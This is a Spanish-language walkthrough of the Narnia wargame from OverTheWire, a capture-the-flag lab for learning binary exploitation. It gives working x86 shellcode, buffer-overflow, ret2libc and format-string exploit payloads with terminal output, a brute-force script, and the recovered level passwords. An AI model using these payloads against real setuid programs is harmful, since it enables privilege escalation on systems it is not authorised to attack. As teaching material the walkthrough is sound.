# Narnia
Link: https://overthewire.org/wargames/narnia/

Narnia is a wargame that has been rescued from the demise of intruded.net, previously hosted on narnia.intruded.net. Big thanks to adc, morla and reth for their help in resurrecting this game!

What follows below is the original description of narnia, copied from intruded.net:

Summary:
Difficulty:     2/10
Levels:         10
Platform:   Linux/x86

Author:
nite

## Level 0
```C
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

El compilador almacena `buf` en una dirección de memoria mayor a la de `val`, el stack crece hacia abajo, un buffer overflow permite sobreescribir `val`. `val` debe sobreescribirse con bytes en little-endian.

```
narnia0@narnia:/narnia$ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*20 + b'\xef\xbe\xad\xde')"; echo "cat /etc/narnia_pass/narnia1") | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
WDcYUTG5ul
```

Pass: `WDcYUTG5ul`

## Level 1
```C
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

```
narnia1@narnia:/narnia$ file narnia1
narnia1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=21fddcd93fcd02a25ca3910950aa9760890721dc, for GNU/Linux 3.2.0, not stripped
```

Almacenamos shellcode en `EGG` para ejecutarlo. Necesitamos shellcode de 32 bits. Por ejemplo:
```asm
BITS 32
section .text
  global _start

_start:

    ; ebx => ["/bin/sh"]
    xor ebx,ebx
    push ebx
    push 0x68732f2f     ; "hs//"
    push 0x6e69622f     ; "nib/"
    mov ebx,esp

   ; ecx => NULL
   ; edx => NULL
    xor ecx,ecx
    xor edx,edx

   ; syscall 11
    xor eax,eax
    mov al, 11

    int 0x80
```

Usé `nasm` para generar el shellcode y algunos comandos para convertirlo en un formato que puedo pasar a la variable.

```
xxd x86_linux_execve
00000000: 31db 5368 2f2f 7368 682f 6269 6e89 e331  1.Sh//shh/bin..1
00000010: c931 d231 c0b0 0bcd 80                   .1.1.....
 xxd x86_linux_execve | awk '{for(i=2;i<=NF-2;i++) printf "%s", $i }' | sed 's/\(..\)/\\x\1/g'
\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd
```

```
narnia1@narnia:/narnia$ EGG=$(echo -e "\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80") ./narnia1
Trying to execute EGG!
$  cat /etc/narnia_pass/narnia2
cat: /etc/narnia_pass/narnia2: Permission denied
$ id
uid=14001(narnia1) gid=14001(narnia1) groups=14001(narnia1)
$ id
```

Ok, eso no funcionó porque la shell restaura los privilegios reales. Hay que modificar el shellcode para que lo haga. Podemos usar `setruid(getuid, getuid)` para que la id real (narnia1) sea la misma que la id efectiva (narnia2) y que la shell se ejecute con privilegios.
```asm
BITS 32
section .text
  global _start

_start:
    ; clean
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; geteuid()
    push 0x31
    pop eax
    int 0x80
    
    ; setruid(geteuid(),geteuid())
    mov ebx, eax
    mov ecx, eax
    push 0x46
    pop eax
    int 0x80

    ; execve("/bin/bash",NULL,NULL)
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx,esp
    mov ecx,edx
    mov al, 11
    int 0x80
```

```
narnia1@narnia:/narnia$ export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80')")
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ id
uid=14002(narnia2) gid=14001(narnia1) groups=14001(narnia1)
$ cat /etc/narnia_pass/narnia2
5agRAXeBdG
```

Pass `5agRAXeBdG`

## Level 2
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

Podemos observar un buffer overflow claro, además el programa no tiene PIE y el stack es ejecutable
```
narnia2@narnia:/narnia$ readelf -h narnia2 | grep Type
  Type:                              EXEC (Executable file)
narnia2@narnia:/narnia$ readelf -l narnia2 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```

La estrategia es hacer un ret2shellcode:
```
gdb) set args aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
(gdb) r
Starting program: /narnia/narnia2 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x62616169 in ?? ()
gdb) x/wx $esp
0xffffd280:     0x6261616a
```

El offset es 132. Podemos elegir  una dirección de retorno  "más o menos" esperada. Nuestra carga útil será un `offset + return_address + NOP sled + shellcode`. De [este artículo](https://stackoverflow.com/questions/63959200/the-maximum-summarized-size-of-argv-envp-argc-command-line-arguments-is-alwa) estimamos que el tamaño de nuestro argumento puede ser de 131072(0x20000) bytes, más o menos. Investigando más el lector verá que este valor suele variar.

```
>>> hex(0xfff0000 + 100000)
'0x100086a0'
```

Dado que esto tamaño ocupa el espacio de direcciones completo es solo cuestión de encontrar una dirección entre el lugar donde comienza a escibir `strcpy` y el límite del mapeo del stack en memoria.

```
./narnia2 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*132 + b'\x80\x52\xfe\xff' + b'\x90'*100000 + b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80')"`
$ cat /etc/narnia_pass/narnia3
2xszzNl6uG
```

Pass: `2xszzNl6uG`

## Level 3

Como `argv[1]` se almacena en `ifile` con `strcpy`, permite sobreescribir `ofile`:
```
strace /narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
openat(AT_FDCWD, "AAB", O_RDWR)         = -1 ENOENT (No such file or directory)
...
write(1, "error opening AAB\n", 18error opening AAB
)     = 18
exit_group(-1)                          = ?
+++ exited with 255 +++
```

Creamos un `ofile` (enlace simbolico a `/etc/narnia_pass/narnia3`) y un `ifile` (un archivo cualquiera que se pueda escribir) de tal forma que obtengamos el contenido.

```
narnia3@narnia:/narnia$ mkdir -p /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/
narnia3@narnia:/narnia$  ln -s /etc/narnia_pass/narnia4 '/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/BBBBBBBBBBBB'
narnia3@narnia:/narnia$  touch /tmp/BBBBBBBBBBBB
narnia3@narnia:/narnia$  ./narnia3  /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/BBBBBBBBBBBB
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/BBBBBBBBBBB to a safer place... (/tmp/BBBBBBBBBBB)
narnia3@narnia:/narnia$ cat /tmp/BBBBBBBBBBBB
iqNWNk173q
```

Pass: `iqNWNk173q`

## Level 4

Igual que el nivel 2, un ret2shellcode, solo que el offset es distinto.

```
narnia4@narnia:/narnia$ ./narnia4 `python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*264 + b'\x80\x52\xfe\xff' + b'\x90'*100000 + b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80')"`
$ id
uid=14005(narnia5) gid=14004(narnia4) groups=14004(narnia4)
$ cat /etc/narnia_pass/narnia4
cat: /etc/narnia_pass/narnia4: Permission denied
$ cat /etc/narnia_pass/narnia5
Ni3xHPEuuw
```

Pass: `Ni3xHPEuuw`

## Level 5
```C

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
        setreuid(geteuid(),geteuid());
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
```

Una vulnerabilidad de cadena formateada:
```
narnia5@narnia:/narnia$ ./narnia5 AAAA%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA41414141] (12)
i = 1 (0xffffd350)
```

Usando el operador de formato `%O$n`, donde `O` es el offset con respecto al tope del stack, escribimos en la direccion de memoria en esa posicion el numero de bytes de la cadena de formato:
```
narnia5@narnia:/narnia$ ./narnia5 `python3 -c 'import sys; sys.stdout.buffer.write(b"\x50\xd3\xff\xff%496x%1$n")'`
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
BNSjoSDeGL
```

Pass: `BNSjoSDeGL`

## Level 6
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int  (*fp)(char *)=(int(*)(char *))&puts, i;

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);
        strcpy(b2,argv[2]);
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        setreuid(geteuid(),geteuid());
    fp(b1);

        exit(1);
}
```

```
narnia6@narnia:/narnia$ readelf -l narnia6 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
narnia6@narnia:/narnia$ readelf -h narnia6 | grep -E "Type"
  Type:                              EXEC (Executable file)
```

Nuevamente tenemos un buffer overflow, pero esta vez el stack no es ejecutable. Aunque si el lector no lo ha notado, este sistema no tiene ASLR habilitado:
```
narnia6@narnia:/narnia$  cat /proc/sys/kernel/randomize_va_space
0
```

El programa tiene a `fp` como puntero a `puts`, y toma como argumento una cadena. Si reemplazamos su dirección con la dirección de `system` podemos invocar una shell. El binario ya hace `setreuid` para evitar soltar privilegios por nosotros. Esto es un ret2libc bastante sencillo:
```
(gdb) start
Temporary breakpoint 1 at 0x80491e7
Starting program: /narnia/narnia6
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Temporary breakpoint 1, 0x080491e7 in main ()
(gdb) p &system
$1 = (int (*)(const char *)) 0xf7dcd430 <__libc_system>
Quit anyway? (y or n) y
narnia6@narnia:/narnia$ ./narnia6 `python3 -c 'import sys; sys.stdout.buffer.write(b"sh;AAAAA" + b"\x30\xd4\xdc\xf7")'` b
$ id
uid=14007(narnia7) gid=14006(narnia6) groups=14006(narnia6)
$ cat /etc/narnia_pass/narnia7
54RtepCEU0
```

Pass: `54RtepCEU0`

## Level 7
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
            fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```

Otra vulnerabilidad de cadena formateada. Sobreescribimos el puntero `ptrf` en `vuln` con la direccion de `hackedfunction`:
```
narnia7@narnia:/narnia$  ./narnia7 `python3 -c 'import sys; sys.stdout.buffer.write(b"\xb8\xd2\xff\xff" + b"%134517515d%1$n")'`
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd2b8)
I guess you want to come to the hackedfunction...
Segmentation fault (core dumped)
narnia7@narnia:/narnia$ ./narnia7 `python3 -c 'import sys; sys.stdout.buffer.write(b"\xb8\xd2\xff\xff" + b"%134517515d%2$n")'`
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd2b8)
I guess you want to come to the hackedfunction...
Way to go!!!!$ cat /etc/narnia_pass/narnia8
i1SQ81fkb8
```

Pass: `i1SQ81fkb8`

## Level 8
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global until i find a fix
// -morla
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){

        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}
```

```
narnia8@narnia:/narnia$ ./narnia8 aaaabaaacaaadaaaeaaaf
aaaabaaacaaadaaaeaaafH
narnia8@narnia:/narnia$ ./narnia8 aaaabaaacaaadaaaeaaafa
aaaabaaacaaadaaaeaaafH
narnia8@narnia:/narnia$ ./narnia8 aaaabaaacaaadaaaeaaafaa
aaaabaaacaaadaaaeaaaf.H
narnia8@narnia:/narnia$ ./narnia8 aaaabaaacaaadaaaeaaafaab
```

El buffer overflow en `book` sobreescribió el puntero `blah`, que originalmente apuntaba a `argv[1]` en el stack.

Queremos que el puntero se mantenga exactamente como estaba para que nuestra carga util continue sin problemas. Luego hacer a `eip` apuntar a la continuacion de nuestra entrada, un shellcode. Para hacer esto hay que ajustar bien las direcciones de memoria con `gdb`. En resumen:
- Hacer un breakpoint en 0x080491d4: `b *0x080491d4`
- Pasar como argumento la carga util con el shellcode
```
set args \`python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x92\xdf\xff\xff" + b"BBBB" + b"\xd4\xdd\xff\xff" + b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80")`
```
- Ajustar `\x92\xdf\xff\xff` (direccion de argv1) y `\xd4\xdd\xff\xff` (direccion del shellcode) 

```
(gdb) set args `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x35\xd5\xff\xff" + b"BBBB" + b"\xf4\xd2\xff\xff" + b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80")'`
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x35\xd5\xff\xff" + b"BBBB" + b"\xf4\xd2\xff\xff" + b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80")'
Continuing.
AAAAAAAAAAAAAAAAAAAA5BBBB1111j1X̀ÉjFX̀Rh//shh/bin
                                               ̀4`
process 88 is executing new program: /usr/bin/dash
Download failed: Permission denied.  Continuing without separate debug info for /usr/bin/dash.
```

El exploit funciona bien con gdb pero no con el programa normal, debido a las variables de entorno que añade gdb:
```
$ diff entorno1 entorno2
30c30,32
< _=/usr/bin/env
---
> _=/usr/bin/gdb
> LINES=22
> COLUMNS=61
```

Revisar algunas posibles soluciones en [este artículo](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it) no me llevó muy lejos (no probé los scripts de bash).

<img width="299" height="168" alt="images" src="https://github.com/user-attachments/assets/74d7d4b9-29b4-4f0a-ba35-184984c822cb" />

*No pensaba que este nivel se me complicaría tanto, discuto lo que hice a continuación.*

Se puede obtener el valor correcto del puntero de esta forma:
```
narnia8@narnia:/narnia$ ./narnia8 `python3 -c 'print(20 * "A")'`  | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 90d5 ffff 48d3 ffff 0192 0408  AAAA....H.......
00000020: 87d5 ffff 0a
```

Le restamos 53 bytes del resto de la carga util:
```
>>> hex(0xffffd590 - 53)
'0xffffd55b'
>>>
```

```
narnia8@narnia:/narnia$ 
./narnia8 `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x5b\xd5\xff\xff" + b"BBBB" + b"\x94\xdd\xff\xff" + b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80")'`
AAAAAAAAAAAAAAAAAAAARBBBB1111j1X̀ÉjFX̀Rh//shh/bin
                                               ̀4`
Segmentation fault (core dumped)
```

Ahora para encontrar la direccion de `argv[1]`, el método que me funcionó fue hacer fuerza bruta:
```sh
#!/bin/bash

for i in {1..255}; do
    byte=$(printf "\x%02x" $i 2>/dev/null)

    echo "Probando byte: $byte (valor $i)"
    
    ./narnia8 $(python3 -c "
import sys
payload = b'A'*20 + b'\x5b\xd5\xff\xff' + b'BBBB' + b'$byte\xd5\xff\xff' + b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80'
sys.stdout.buffer.write(payload)
")
done
```

```
nan8.sh: line 3:  4700 Segmentation fault      (core dumped) /narnia/narnia8 $(python3 -c "
import sys
payload = b'A'*20 + b'\x4f\xd5\xff\xff' + b'BBBB' + b'$byte\xd5\xff\xff' + b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80'
sys.stdout.buffer.write(payload)
")
Probando byte: \x69 (valor 105)
AAAAAAAAAAAAAAAAAAAAOBBBBi1111j1X̀ÉjFX̀Rh//shh/bin
$ id
uid=14009(narnia9) gid=14008(narnia8) groups=14008(narnia8)
$ cat /etc/narnia_pass/narnia9
1FFD4HnU4K
```

Pass: `1FFD4HnU4K`

## Level 9
you are l33t! next plz...

(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)

